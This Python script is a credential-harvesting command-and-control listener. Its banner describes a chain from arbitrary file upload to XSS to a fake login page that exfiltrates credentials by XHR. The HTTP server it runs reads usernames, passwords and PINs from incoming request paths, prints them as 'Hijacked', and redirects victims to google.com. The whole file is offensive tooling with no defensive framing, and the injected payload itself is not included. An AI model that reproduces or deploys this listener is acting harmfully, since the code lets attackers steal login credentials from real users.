#!/usr/bin/python3

import socket,sys,urllib,re
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

banner = ("\n\nArbitrary File Upload -> XSS -> Malicious Login Page -> XHR -> Credential Harvesting \n\n")

ok = str('[+] ')
err = str('[!] ')
info = str('[-] ')

class R(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(302) #sends a redirect after the creds are harvested
        self.send_header('Location', 'http://www.google.com') #redirect URL
       # self.send_response(200)
       # self.send_header('Content-type', 'text/html')
        self.end_headers()
    def log_message(self, format, *args):
        return

    def do_GET(self):
        stolen_data = str(self.path[1:]) #sets stolen data variable
#        print(stolen_data)
        parsed_data = ((re.split("&|\=|\.", stolen_data))) #splits data into parsable list
#        print(parsed_data)
        print(f"{ok}Exploit Triggered...\n{info}Harvesting Creds and parsing through data...")
        if 'username' in stolen_data:
            print(f"{info}Got something...")
#           print(stolen_data.partition(split)[0])
            username = (parsed_data)[2]
#            print(stolen_data)
            print(f"{ok}Hijacked username: {username}")
#            print(f"Hijacked username: " + str(self.path[10:-4]))
        else:
            print(f"{err}Couldn't capture username, check logs...")
        if 'password' in stolen_data:
            print(f"{info}Got something else...")
            password = (parsed_data)[4]
            print(f"{ok}Hijacked password: {password}")
        else:
            print(f"{err}Couldn't capture password... check logs...")
        if 'pin' in stolen_data:
            print(f"{info}Got something else...")
            pin = (parsed_data)[6]
            print(f"{ok}Hijacked pin: {pin}")
        else:
            print(f"{err}Couldn't capture pin... check logs...")
        print(f"\n{info}C2 Server in listening mode... Key interrupt to terminate C2") 
        self._set_response()
        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))

#    def do_POST(self):
#        content_length = int(self.headers['Content-Length'])
#        post_data = self.rfile.read(content_length)
#        logging.info("POST request, \nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n", str(self.path), str(self.headers, post_data.decode('utf-8'))
#        self._set_response()
#        self.wfile.write("POST request for {}".format(self.path).encode('utf-8')

def run(server_class=HTTPServer, handler_class=R, port=8080):
       logging.basicConfig(level=logging.INFO)
       server_address = ('', port)
       httpd = server_class(server_address, handler_class)
       print(banner)
       print(f"{info}Starting C2 Server...")
       print(f"{ok}Waiting for connection to harvest credentials...")
       try:
           httpd.serve_forever()
       except KeyboardInterrupt:
           pass
       httpd.server_close()
       print(f'\n\n{err}Halting C2 Server...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()

